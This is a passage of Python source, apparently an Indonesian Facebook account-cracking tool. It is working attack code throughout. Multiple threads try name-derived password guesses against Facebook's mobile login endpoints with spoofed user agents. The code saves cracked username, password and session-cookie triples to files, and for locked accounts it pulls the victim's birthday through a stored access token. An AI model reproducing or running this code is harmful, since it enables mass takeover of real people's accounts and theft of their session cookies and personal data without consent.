start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
				po = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
				if 'c_user' in session.cookies.get_dict():
					coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
					wrt = '%s|%s|%s' % (user,pw,coki)
					ok.append(wrt)
					open('Hasil/OK-'+durasi+'.txt','a').write('%s\n' % wrt)
					zczc = ('\r%s |-->%s%s|%s|%s                 ' % (Q,I,user,pw,coki))
					cek_cookies_by_risky(user, coki, zczc);play_mpv(".Wiii.mp3")
					break
				elif 'checkpoint' in session.cookies.get_dict():
					try:kontol = open('.login.txt').read();cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday'];month, day, year = cp_ttl.split('/');month = bulan_ttl[month];print('\r%s |-->%s%s|%s|%s %s %s       ' % (Q,K,user,pw,day,month,year));wrt = '%s|%s|%s %s %s' % (user,pw,day,month,year);cp.append(wrt);open('Hasil/CP-'+durasi+'.txt','a').write('%s\n' % wrt);break
					except (KeyError, IOError):month = '';day   = '';year  = ''
					except:pass
					print('\r%s |-->%s%s|%s                 ' % (Q,K,user,pw));wrt = '%s|%s' % (user,pw);cp.append(wrt);open('Hasil/CP-'+durasi+'.txt','a').write('%s\n' % wrt);play_mpv(".Wiii.mp3")
					break
				else:continue
			loop += 1


	def mobile_v4(self, user, kiky__gtg):
		global ok,cp,loop
		sys.stdout.write('\r%s |-->%s%s%s %s/%s OK:%s CP:%s %s'%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,loop,len(self.id),len(ok),len(cp), Q)),
		sys.stdout.flush()
		if "" == "":
			for pw in kiky__gtg:
				pw = pw.lower()
				session = requests.Session()
				ua_random = random.choice([
					'[FBAN/FB4A;FBAV/246.0.0.49.121;FBBV/181448449;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBRV/183119516;FBCR/TM;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1606;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
					'[FBAN/FB4A;FBAV/223.0.0.47.120;FBBV/156649505;FBDM/{density=2.625,width=1080,height=2034};FBLC/sv_SE;FBRV/0;FBCR/Telia;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 7 plus;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
				])
				session.headers.update({"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":ua_random,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
				p = session.get('https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
				dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
				session.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua_random,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
				po = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
				if 'c_user' in session.cookies.get_dict():
					coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
					wrt = '%s|%s|%s' % (user,pw,coki)
					ok.append(wrt)
					open('Hasil/OK-'+durasi+'.txt','a').write('%s\n' % wrt)
					zczc = ('\r%s |-->%s%s|%s|%s                 ' % (Q,I,user,pw,coki))
					cek_cookies_by_risky(user, coki, zczc);play_mpv(".Wiii.mp3")
					break
				elif 'checkpoint' in session.cookies.get_dict():
					try:kontol = open('.login.txt').read();cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday'];month, day, year = cp_ttl.split('/');month = bulan_ttl[month];print('\r%s |-->%s%s|%s|%s %s %s       ' % (Q,K,user,pw,day,month,year));wrt = '%s|%s|%s %s %s' % (user,pw,day,month,year);cp.append(wrt);open('Hasil/CP-'+durasi+'.txt','a').write('%s\n' % wrt);break
					except (KeyError, IOError):month = '';day   = '';year  = ''
					except:pass
					print('\r%s |-->%s%s|%s                 ' % (Q,K,user,pw));wrt = '%s|%s' % (user,pw);cp.append(wrt);open('Hasil/CP-'+durasi+'.txt','a').write('%s\n' % wrt);play_mpv(".Wiii.mp3")
					break
				else:continue
			loop += 1

	def metode(self, user, pwx, url):
		global ok,cp,loop
		sys.stdout.write('\r%s |-->%s%s%s %s/%s OK:%s CP:%s %s'%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,loop,len(self.id),len(ok),len(cp), Q)),
		sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			session=requests.Session()
			header = {"Host":url,"upgrade-insecure-requests":"1","user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			r = session.get(f"https://{url}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)
			das = {"lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
			header1 = {"Host":url,"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://"+url,"content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://"+url+"/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = session.post(f"https://{url}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
			if 'c_user' in session.cookies.get_dict():
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				wrt = '%s|%s|%s' % (user,pw,coki)
				ok.append(wrt)
				open('Hasil/OK-'+durasi+'.txt','a').write('%s\n' % wrt)
				zczc = ('\r%s |-->%s%s|%s|%s                 ' % (Q,I,user,pw,coki))
				cek_cookies_by_risky(user, coki, zczc);play_mpv(".Wiii.mp3")
				break
			elif 'checkpoint' in session.cookies.get_dict():
				try:kontol = open('.login.txt').read();cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday'];month, day, year = cp_ttl.split('/');month = bulan_ttl[month];print('\r%s |-->%s%s|%s|%s %s %s       ' % (Q,K,user,pw,day,month,year));wrt = '%s|%s|%s %s %s' % (user,pw,day,month,year);cp.append(wrt);open('Hasil/CP-'+durasi+'.txt','a').write('%s\n' % wrt);break
				except (KeyError, IOError):month = '';day   = '';year  = ''
				except:pass
				print('\r%s |-->%s%s|%s                 ' % (Q,K,user,pw));wrt = '%s|%s' % (user,pw);cp.append(wrt);open('Hasil/CP-'+durasi+'.txt','a').write('%s\n' % wrt);play_mpv(".Wiii.mp3")
				break
			else:continue
		loop+=1

	def metode_v1(self, idf, pwx):
		global ok,cp,loop
		sys.stdout.write('\r%s |-->%s%s%s %s/%s OK:%s CP:%s %s'%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,loop,len(self.id),len(ok),len(cp), Q)),
		sys.stdout.flush()
		user = idf
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			header1 = {
				"Host": "m.facebook.com",
				"cache-control": "max-age=0",
				"upgrade-insecure-requests": "1",
				"user-agent": "NokiaX3-02/5.0 (06.05) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
				"x-requested-with": "mark.via.gp",
				"sec-fetch-site": "none",
				"sec-fetch-mode": "navigate",
				"sec-fetch-user": "?1",
				"sec-fetch-dest": "document",
				"referer": "https://developers.facebook.com/",
				"accept-encoding": "gzip, deflate",
				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
			}
			z = ses.get("https://m.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjQ1NTE3NDA0LCJjYWxsc2l0ZV9pZCI6Mjc2MjMwNjIxNzQyMjQ4NX0%3D&next=https%3A%2F%2Fdevelopers.facebook.com%2F%3Flocale%3Did_ID&refsrc=deprecated&_rdr", headers=header1)
			dt = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(z.text)).group(1),
				"jazoest":re.search('name="jazoest" value="(.*?)"', str(z.text)).group(1),
				"uid":idf,
				"flow":"login_no_pin",
				"pass":pw,
				"next":"https://developers.facebook.com/?locale=id_ID"
			}
			header2 = {
				"Host": "m.facebook.com",
				"content-length": "129",
				"cache-control": "max-age=0",
				"upgrade-insecure-requests": "1",
				"origin": "https://m.facebook.com",
				"content-type": "application/x-www-form-urlencoded",
				"user-agent": "Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-G925F Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36",
				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
				"x-requested-with": "mark.via.gp",
				"sec-fetch-site": "same-origin",
				"sec-fetch-mode": "navigate",
				"sec-fetch-user": "?1",
				"sec-fetch-dest": "document",
				"referer": "https://m.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjQ1NTE3NDA0LCJjYWxsc2l0ZV9pZCI6Mjc2MjMwNjIxNzQyMjQ4NX0%3D&next=https%3A%2F%2Fdevelopers.facebook.com%2F%3Flocale%3Did_ID&refsrc=deprecated&_rdr",
				"accept-encoding": "gzip, deflate",
				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
			}
			j = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0", data = dt, headers = header2, allow_redirects = True)
			if 'c_user' in ses.cookies.get_dict():
				coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
				wrt = '%s|%s|%s' % (user,pw,coki)
				ok.append(wrt)
				open('Hasil/OK-'+durasi+'.txt','a').write('%s\n' % wrt)
				zczc = ('\r%s |-->%s%s|%s|%s                 ' % (Q,I,user,pw,coki))
				cek_cookies_by_risky(user, coki, zczc);play_mpv(".Wiii.mp3")
				break
			elif 'checkpoint' in ses.cookies.get_dict():
				try:kontol = open('.login.txt').read();cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday'];month, day, year = cp_ttl.split('/');month = bulan_ttl[month];print('\r%s |-->%s%s|%s|%s %s %s       ' % (Q,K,user,pw,day,month,year));wrt = '%s|%s|%s %s %s' % (user,pw,day,month,year);cp.append(wrt);open('Hasil/CP-'+durasi+'.txt','a').write('%s\n' % wrt);break
				except (KeyError, IOError):month = '';day   = '';year  = ''
				except:pass
				print('\r%s |-->%s%s|%s                 ' % (Q,K,user,pw));wrt = '%s|%s' % (user,pw);cp.append(wrt);open('Hasil/CP-'+durasi+'.txt','a').write('%s\n' % wrt);play_mpv(".Wiii.mp3")
				break
			else:continue
		loop+=1

	def metode_v3(self, idf, pwx, url):
		global ok,cp,loop
		sys.stdout.write('\r%s |-->%s%s%s %s/%s OK:%s CP:%s %s'%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,loop,len(self.id),len(ok),len(cp), Q)),
		sys.stdout.flush()
		user = idf
		for pw in pwx:
			pw = pw.lower()
			ses=requests.Session()
			header1 = {"Host":url,"upgrade-insecure-requests":"1","user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			rg = ses.get(f"https://{url}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header1)
			dt = {"lsd":re.search('name="lsd" value="(.*?)"', str(rg.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(rg.text)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
			header2 = {"Host":url,"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://"+url,"content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://"+url+"/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			rp = ses.post(f"https://{url}/login/device-based/validate-password/?shbl=0", data = dt, headers = header2, allow_redirects = False)
			if 'c_user' in ses.cookies.get_dict():
				coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
				wrt = '%s|%s|%s' % (user,pw,coki)
				ok.append(wrt)
				open('Hasil/OK-'+durasi+'.txt','a').write('%s\n' % wrt)
				zczc = ('\r%s |-->%s%s|%s|%s                 ' % (Q,I,user,pw,coki))
				cek_cookies_by_risky(user, coki, zczc);play_mpv(".Wiii.mp3")
				break
			elif 'checkpoint' in ses.cookies.get_dict():
				try:kontol = open('.login.txt').read();cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday'];month, day, year = cp_ttl.split('/');month = bulan_ttl[month];print('\r%s |-->%s%s|%s|%s %s %s       ' % (Q,K,user,pw,day,month,year));wrt = '%s|%s|%s %s %s' % (user,pw,day,month,year);cp.append(wrt);open('Hasil/CP-'+durasi+'.txt','a').write('%s\n' % wrt);break
				except (KeyError, IOError):month = '';day   = '';year  = ''
				except:pass
				print('\r%s |-->%s%s|%s                 ' % (Q,K,user,pw));wrt = '%s|%s' % (user,pw);cp.append(wrt);open('Hasil/CP-'+durasi+'.txt','a').write('%s\n' % wrt);play_mpv(".Wiii.mp3")
				break
			else:continue
		loop+=1

	def Opsi_v1(self):
		print(" |")
		print(" |")
		jalan(f" |-->{O}Sebelum Lanjut Apakah Anda Mau Menggunakan Password Gabungan :{Q}")
		oag = input(f" |-->Pilih ({O}Y/n{Q}) :")
		if oag in ("",""):
			jalan(" |-->Jangan Kosong Sayanf.....")
			time.sleep(1)
			self.Opsi_v3()
		elif oag in ("Y","y","G","g"):
			print(" |")
			jalan(" |-->Silahkan Gunakan Koma Untuk Pemisah Password...")
			jalan(' |-->Semakin Banyak Password Yang Anda Gunakan, Semakin Leled Saat Crack...')
			jalan(f" |-->Contoh : {II}sayang,kontol,anjing{Q}")
			tambahx = input(f" |-->Password : ").split(",")
			pasq = "Y"
			print(" |")
		elif oag in ("N","n","t","T"):
			print(" |")
			pasq = "N"
		else:
			print(" |")
			jalan(" |-->Isi Dengan Benar Dong...")
			print(" |")
			time.sleep(1)
			self.Opsi_v3()
		self.pro_ses()
		with __Kiky__(max_workers=35) as (form):
			for uname in self.id:
				try:
					id_z,nama_aq = uname.split('<=>')
					zZzZ = nama_aq.split(' ')
					zaq=zZzZ[0]
					if len(zaq)>=6:
						pww_ = [zaq, zaq+'123', zaq+'1234', zaq+'12345', nama_aq]
					elif len(zaq)<=2:
						pww_ = [zaq+'1234', zaq+'12345', nama_aq]
					elif len(zaq)<=5:
						pww_ = [zaq+'123', zaq+'1234', zaq+'12345', nama_aq]
					else:
						pww_ = [zaq, zaq+'123', zaq+'1234', zaq+'12345', nama_aq]
					if pasq in ("N","n"):
						pww_ = pww_
					else:
						pww_ = pww_ + tambahx
					form.submit(self.mobile_v1,id_z, pww_)
				except:pass
		os.remove(self.apk)
		print(" |")
		print(" |")
		print(" |")
		print(" |-->Crack Selesai")
		self.check_opsi()
		os.sys.exit()

	def Opsi_v2(self):
		print(" |")
		print(" |")
		jalan(f" |-->{O}Sebelum Lanjut Apakah Anda Mau Menggunakan Password Gabungan :{Q}")
		oag = input(f" |-->Pilih ({O}Y/n{Q}) :")
		if oag in ("",""):
			jalan(" |-->Jangan Kosong Sayanf.....")
			time.sleep(1)
			self.Opsi_v3()
		elif oag in ("Y","y","G","g"):
			print(" |")
			jalan(" |-->Silahkan Gunakan Koma Untuk Pemisah Password...")
			jalan(' |-->Semakin Banyak Password Yang Anda Gunakan, Semakin Leled Saat Crack...')
			jalan(f" |-->Contoh : {II}sayang,kontol,anjing{Q}")
			tambahx = input(f" |-->Password : ").split(",")
			pasq = "Y"
			print(" |")
		elif oag in ("N","n","t","T"):
			print(" |")
			pasq = "N"
		else:
			print(" |")
			jalan(" |-->Isi Dengan Benar Dong...")
			print(" |")
			time.sleep(1)
			self.Opsi_v3()
		self.pro_ses()
		with __Kiky__(max_workers=35) as (form):
			for uname in self.id:
				try:
					id_z,nama_aq = uname.split('<=>')
					zZzZ = nama_aq.split(' ')
					zaq=zZzZ[0]
					if len(zaq)>=6:
						pww_ = [zaq, zaq+'123', zaq+'1234', zaq+'12345', nama_aq]
					elif len(zaq)<=2:
						pww_ = [zaq+'1234', zaq+'12345', nama_aq]
					elif len(zaq)<=5:
						pww_ = [zaq+'123', zaq+'1234', zaq+'12345', nama_aq]
					else:
						pww_ = [zaq, zaq+'123', zaq+'1234', zaq+'12345', nama_aq]
					if pasq in ("N","n"):
						pww_ = pww_
					else:
						pww_ = pww_ + tambahx
					form.submit(self.mobile_v2,id_z, pww_)
				except:pass
		os.remove(self.apk)
		print(" |")
		print(" |")
		print(" |")
		print(" |-->Crack Selesai")
		self.check_opsi()
		os.sys.exit()

	def Opsi_v3(self):
		print(" |")
		print(" |")
		jalan(f" |-->{O}Sebelum Lanjut Apakah Anda Mau Menggunakan Password Gabungan :{Q}")
		oag = input(f" |-->Pilih ({O}Y/n{Q}) :")
		if oag in ("",""):
			jalan(" |-->Jangan Kosong Sayanf.....")
			time.sleep(1)
			self.Opsi_v3()
		elif oag in ("Y","y","G","g"):
			print(" |")
			jalan(" |-->Silahkan Gunakan Koma Untuk Pemisah Password...")
			jalan(' |-->Semakin Banyak Password Yang Anda Gunakan, Semakin Leled Saat Crack...')
			jalan(f" |-->Contoh : {II}sayang,kontol,anjing{Q}")
			tambahx = input(f" |-->Password : ").split(",")
			pasq = "Y"
			print(" |")
		elif oag in ("N","n","t","T"):
			print(" |")
			pasq = "N"
		else:
			print(" |")
			jalan(" |-->Isi Dengan Benar Dong...")
			print(" |")
			time.sleep(1)
			self.Opsi_v3()
		self.pro_ses()
		with __Kiky__(max_workers=35) as (form):
			for uname in self.id:
				try:
					id_z,nama_aq = uname.split('<=>')
					zZzZ = nama_aq.split(' ')
					zaq=zZzZ[0]
					if len(zaq)>=6:
						pww_ = [zaq, zaq+'123', zaq+'1234', zaq+'12345', nama_aq]
					elif len(zaq)<=2:
						pww_ = [zaq+'1234', zaq+'12345', nama_aq]
					elif len(zaq)<=5:
						pww_ = [zaq+'123', zaq+'1234', zaq+'12345', nama_aq]
					else:
						pww_ = [zaq, zaq+'123', zaq+'1234', zaq+'12345', nama_aq]
					if pasq in ("N","n"):
						pww_ = pww_
					else:
						pww_ = pww_ + tambahx
					form.submit(self.mobile_v3,id_z, pww_)
				except:pass
		os.remove(self.apk)
		print(" |")
		print(" |")
		print(" |")
		print(" |-->Crack Selesai")
		self.check_opsi()
		os.sys.exit()




	def Opsi_v4(self):
		print(" |")
		print(" |")
		jalan(f" |-->{O}Sebelum Lanjut Apakah Anda Mau Menggunakan Password Gabungan :{Q}")
		oag = input(f" |-->Pilih ({O}Y/n{Q}) :")
		if oag in ("",""):
			jalan(" |-->Jangan Kosong Sayanf.....")
			time.sleep(1)
			self.Opsi_v3()
		elif oag in ("Y","y","G","g"):
			print(" |")
			jalan(" |-->Silahkan Gunakan Koma Untuk Pemisah Password...")
			jalan(' |-->Semakin Banyak Password Yang Anda Gunakan, Semakin Leled Saat Crack...')
			jalan(f" |-->Contoh : {II}sayang,kontol,anjing{Q}")
			tambahx = input(f" |-->Password : ").split(",")
			pasq = "Y"
			print(" |")
		elif oag in ("N","n","t","T"):
			print(" |")
			pasq = "N"
		else:
			print(" |")
			jalan(" |-->Isi Dengan Benar Dong...")
			print(" |")
			time.sleep(1)
			self.Opsi_v3()
		self.pro_ses()
		with __Kiky__(max_workers=35) as (form):
			for uname in self.id:
				try:
					id_z,nama_aq = uname.split('<=>')
					zZzZ = nama_aq.split(' ')
					zaq=zZzZ[0]
					if len(zaq)>=6:
						pww_ = [zaq, zaq+'123', zaq+'1234', zaq+'12345', nama_aq]
					elif len(zaq)<=2:
						pww_ = [zaq+'1234', zaq+'12345', nama_aq]
					elif len(zaq)<=5:
						pww_ = [zaq+'123', zaq+'1234', zaq+'12345', nama_aq]
					else:
						pww_ = [zaq, zaq+'123', zaq+'1234', zaq+'12345', nama_aq]
					if pasq in ("N","n"):
						pww_ = pww_
					else:
						pww_ = pww_ + tambahx
					form.submit(self.metode,id_z, pww_, "mbasic.facebook.com")
				except:pass
		os.remove(self.apk)
		print(" |")
		print(" |")
		print(" |")
		print(" |-->Crack Selesai")
		self.check_opsi()
		os.sys.exit()
	def Opsi_v5(self):
		print(" |")
		print(" |")
		jalan(f" |-->{O}Sebelum Lanjut Apakah Anda Mau Menggunakan Password Gabungan :{Q}")
		oag = input(f" |-->Pilih ({O}Y/n{Q}) :")
		if oag in ("",""):
			jalan(" |-->Jangan Kosong Sayanf.....")
			time.sleep(1)
			self.Opsi_v3()
		elif oag in ("Y","y","G","g"):
			print(" |")
			jalan(" |-->Silahkan Gunakan Koma Untuk Pemisah Password...")
			jalan(' |-->Semakin Banyak Password Yang Anda Gunakan, Semakin Leled Saat Crack...')
			jalan(f" |-->Contoh : {II}sayang,kontol,anjing{Q}")
			tambahx = input(f" |-->Password : ").split(",")
			pasq = "Y"
			print(" |")
		elif oag in ("N","n","t","T"):
			print(" |")
			pasq = "N"
		else:
			print(" |")
			jalan(" |-->Isi Dengan Benar Dong...")
			print(" |")
			time.sleep(1)
			self.Opsi_v3()
		self.pro_ses()
		with __Kiky__(max_workers=35) as (form):
			for uname in self.id:
				try:
					id_z,nama_aq = uname.split('<=>')
					zZzZ = nama_aq.split(' ')
					zaq=zZzZ[0]
					if len(zaq)>=6:
						pww_ = [zaq, zaq+'123', zaq+'1234', zaq+'12345', nama_aq]
					elif len(zaq)<=2:
						pww_ = [zaq+'1234', zaq+'12345', nama_aq]
					elif len(zaq)<=5:
						pww_ = [zaq+'123', zaq+'1234', zaq+'12345', nama_aq]
					else:
						pww_ = [zaq, zaq+'123', zaq+'1234', zaq+'12345', nama_aq]
					if pasq in ("N","n"):
						pww_ = pww_
					else:
						pww_ = pww_ + tambahx
					form.submit(self.metode_v3,id_z, pww_, "mbasic.facebook.com")
				except:pass
		os.remove(self.apk)
		print(" |")
		print(" |")
		print(" |")
		print(" |-->Crack Selesai")
		self.check_opsi()
		os.sys.exit()


	def Opsi_v6(self):
		print(" |")
		print(" |")
		jalan(f" |-->{O}Sebelum Lanjut Apakah Anda Mau Menggunakan Password Gabungan :{Q}")
		oag = input(f" |-->Pilih ({O}Y/n{Q}) :")
		if oag in ("",""):
			jalan(" |-->Jangan Kosong Sayang.....")
			time.sleep(1)
			self.Opsi_v3()
		elif oag in ("Y","y","G","g"):
			print(" |")
			jalan(" |-->Silahkan Gunakan Koma Untuk Pemisah Password...")
			jalan(' |-->Semakin Banyak Password Yang Anda Gunakan, Semakin Leled Saat Crack...')
			jalan(f" |-->Contoh : {II}sayang,kontol,anjing{Q}")
			tambahx = input(f" |-->Password : ").split(",")
			pasq = "Y"
			print(" |")
		elif oag in ("N","n","t","T"):
			print(" |")
			pasq = "N"
		else:
			print(" |")
			jalan(" |-->Isi Dengan Benar Dong...")
			print(" |")
			time.sleep(1)
			self.Opsi_v3()
		self.pro_ses()
		with __Kiky__(max_workers=35) as (form):
			for uname in self.id:
				try:
					id_z,nama_aq = uname.split('<=>')
					zZzZ = nama_aq.split(' ')
					zaq=zZzZ[0]
					if len(zaq)>=6:
						pww_ = [zaq, zaq+'123', zaq+'1234', zaq+'12345', nama_aq]
					elif len(zaq)<=2:
						pww_ = [zaq+'1234', zaq+'12345', nama_aq]
					elif len(zaq)<=5:
						pww_ = [zaq+'123', zaq+'1234', zaq+'12345', nama_aq]
					else:
						pww_ = [zaq, zaq+'123', zaq+'1234', zaq+'12345', nama_aq]
					if pasq in ("N","n"):
						pww_ = pww_
					else:
						pww_ = pww_ + tambahx
					form.submit(self.metode_v1,id_z, pww_)
				except:pass
		os.remove(self.apk)
		#print(" |")
		#print(" |")
		#print(" |")
		print(" -->Crack Selesai")
		self.check_opsi()
		os.sys.exit()



	def check_opsi(self):
		#print(" |")
		jalan(" --> Sebelum Lanjut Harap Hidup Matikan Mode Pesawat Selama 2.Detik")
		ask = input(f" --> Apakah Anda Mau Lasung Check Opsi ({O}Y/n{Q}):")
		if ask in ["Y", "y"]:
			print(" --> Total Akun Yang Check Point : %s%s%s"%(O,len(cp),Q))
			#print(" |")
			#print(" |")
			for memek in cp:
				kontol = memek.replace("\n","")
				titid  = kontol.split("|")
				print(" |")
				print(" |-->%s"%(kontol))
				try:self.cek_opsi_cp(titid[0], titid[1])
				except requests.exceptions.ConnectionError:pass
				except:pass
			print(" |")
			jalan(" |--> Check Akun Sudah Selesai....")
			os.sys.exit()
		else:os.sys.exit()
	def cek_opsi_cp(self, user, pasw):
		data = {}
		mb = ("https://mbasic.facebook.com")
		ua = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]" 
		ses = requests.Session()
